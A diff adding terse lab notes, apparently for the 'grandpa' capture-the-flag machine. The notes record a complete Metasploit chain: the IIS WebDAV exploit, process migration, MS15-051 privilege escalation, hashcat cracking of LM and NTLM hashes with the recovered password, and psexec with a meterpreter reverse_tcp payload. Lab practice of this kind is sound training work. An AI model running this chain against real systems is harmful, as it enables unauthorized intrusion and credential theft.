@@ -1,0 +1,52 @@
+## For attack on grandpa, looking for simple cve allowed access to box easily, cve found
+### use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+#### After gettin meterpreter shell migrated processes, used "ps" to find process to switch to and 
+#### migrate. Looked networkservice user
+meterpreter > getuid
+[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
+migrate 2208
+meterpreter > getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+
+
+### Now elevate privileges
+use post/multi/recon/local_exploit_suggester
+set session 7
+run
+
+
+use exploit/windows/local/ms15_051_client_copy_image
+set session 7
+run
+
+### Got system user shell
+
+##Inorder to crack lan manager hash, we need apropriate match number and hash and set the attack mode 
+##to brute force
+echo "0a70918d669baeb307012642393148ab" > grandpa.hash
+## The ?u?u?u?u are characters number length to brute force specifically, it has to be done twice to 
+## get correct charcaters from hash, once all two parts are cracked it will show up as a whole
+hashcat -m 3000 grandpa.hash -a 3 ?u?u?u?u?u?u?u
+hashcat -m 3000 grandpa.hash -a 3 ?u?u?u?u?u?u
+hashcat -m 3000 grandpa.hash -a 3 --show
+0a70918d669baeb307012642393148ab:FKOEJENDKENDK
+vim grandpa.lm
+
+## The toggle5 is to set at least 5 possible characters lowercase, uppercase, maybe need more info
+hashcat -m 1000  grandpa.ntlm grandpa.lm -r /usr/share/hashcat/rules/toggles5.rule --show
+34dec8a1db14cdde2a21967c3c997548:fkoejEndKEndk
+
+portfwd add -l 445 -p 445 -r 127.0.0.1
+smbclient //localhost/c$ -U Administrator
+
+OR psexec
+
+use exploit/windows/smb/psexec
+set rhosts localhost
+set share c$
+set smbuser administrator
+set smbpass fkoejEndKEndk
+set payload windows/meterpreter/reverse_tcp
+set lhost tun0
+set lport 6666
+run
